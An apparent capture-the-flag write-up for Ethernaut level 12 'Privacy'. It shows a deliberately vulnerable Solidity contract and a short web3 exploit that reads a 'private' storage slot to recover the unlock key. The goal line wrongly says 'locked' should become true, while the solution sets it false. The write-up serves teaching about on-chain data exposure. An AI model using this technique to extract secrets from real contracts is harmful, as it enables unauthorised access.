# 12 - Privacy

Ethernaut Level12: Privacy

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Privacy {

  bool public locked = true;
  uint256 public ID = block.timestamp;
  uint8 private flattening = 10;
  uint8 private denomination = 255;
  uint16 private awkwardness = uint16(block.timestamp);
  bytes32[3] private data;

  constructor(bytes32[3] memory _data) {
    data = _data;
  }
  
  function unlock(bytes16 _key) public {
    require(_key == bytes16(data[2]));
    locked = false;
  }
}
```

### Goal of this level

* make `locked` variable `true`

### What you should know before

* Variable Packing\
  \-> see [here](https://fravoll.github.io/solidity-patterns/tight\_variable\_packing.html)
* Storage Layout\
  \-> see [here](https://www.youtube.com/watch?v=Gg6nt3YW74o\&t=3s)
* Type Conversion



## Solution

<details>

<summary>Key to solve this problem 🔑</summary>

You can directly access the storage where data\[2] is stored.

Once we have that value, this level will be easily solved!

</details>

This is the storage layout of `Privacy` contract.

* slot0: `locked`
* slot1: `ID`
* slot2: `awkwardness` / `denomination` / `flattening`
* slot3: `data[0]`
* slot4: `data[1]`
* slot5: `data[2]`

Let's read slot5.

```javascript
> const val = await web3.eth.getStorageAt(contract.address, 5);
// '0x679350029df6d13ef8b094a3d41a9eccad9be90494637f24e532202e64e4527d'
```

We just have to slice first half of this value for `_key`.\
(this is how `bytes32` is converted to `bytes16`)

```javascript
> const _key = val.substr(0, 34);
// '0x' + first 16 bytes

> await contract.unlock(_key);
```

Done! 😎

## Key Takeaways

* Never store private data in blockchain
* The keyword private does not mean you cannot read the data.
